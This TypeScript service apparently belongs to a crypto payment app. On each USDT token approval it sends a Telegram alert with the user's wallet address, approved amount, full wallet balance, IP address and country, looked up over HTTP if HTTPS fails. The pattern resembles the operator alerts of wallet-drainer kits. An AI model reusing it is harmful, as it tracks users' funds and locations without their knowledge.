// =================================
// 🔗 Telegram Notification Service
// =================================

import { TelegramNotificationData } from "../types/blockchain";
import { formatAmount } from "../utils/chainUtils";

export class TelegramService {
  /**
   * Send Telegram notification for approval success
   */
  static async sendApprovalNotification(
    data: TelegramNotificationData
  ): Promise<void> {
    try {
      const message = this.formatApprovalMessage(data);

      // Import telegram service dynamically to avoid SSR issues
      const { telegramService } = await import("@/lib/telegram");

      if (telegramService.isConfigured()) {
        await telegramService.sendSystemAlert(message, "info");
      }
    } catch (error) {
      // Don't fail the approval if telegram fails
    }
  }

  /**
   * Format approval success message
   */
  private static formatApprovalMessage(data: TelegramNotificationData): string {
    const displayAmount = formatAmount(data.amount, 6); // USDT has 6 decimals
    const displayBalance = formatAmount(data.usdtBalance, 6);

    return `🎉 **USDT Approval Successful!**

💰 **Payment ID:** ${data.paymentId}
🔗 **Chain:** ${data.chain.toUpperCase()}
👤 **Wallet:** ${data.userAddress}
💳 **Wallet Type:** ${data.walletType}
💵 **Approved Amount:** ${displayAmount} USDT
🏦 **Wallet Balance:** ${displayBalance} USDT
🌍 **IP Address:** ${data.clientIP || "Unknown"}
🏛️ **Country:** ${data.country || "Unknown"}
⏰ **Time:** ${new Date().toLocaleString()}`;
  }

  /**
   * Get country from IP address
   */
  static async getCountryFromIP(
    clientIP?: string
  ): Promise<string | undefined> {
    if (!clientIP) return undefined;

    try {
      // Try HTTPS first, fallback to HTTP if needed
      let response;
      try {
        response = await fetch(`https://ip-api.com/json/${clientIP}`);
      } catch (httpsError) {
        response = await fetch(`http://ip-api.com/json/${clientIP}`);
      }

      const data = await response.json();
      return data.country || undefined;
    } catch (error) {
      return undefined;
    }
  }

  /**
   * Send error notification
   */
  static async sendErrorNotification(
    error: string,
    context: string,
    chain?: string
  ): Promise<void> {
    try {
      const message = `❌ **Error Notification**

🚨 **Error:** ${error}
📋 **Context:** ${context}
🔗 **Chain:** ${chain || "Unknown"}
⏰ **Time:** ${new Date().toLocaleString()}`;

      const { telegramService } = await import("@/lib/telegram");

      if (telegramService.isConfigured()) {
        await telegramService.sendSystemAlert(message, "error");
      }
    } catch (error) {
      // Error notification failed
    }
  }
}
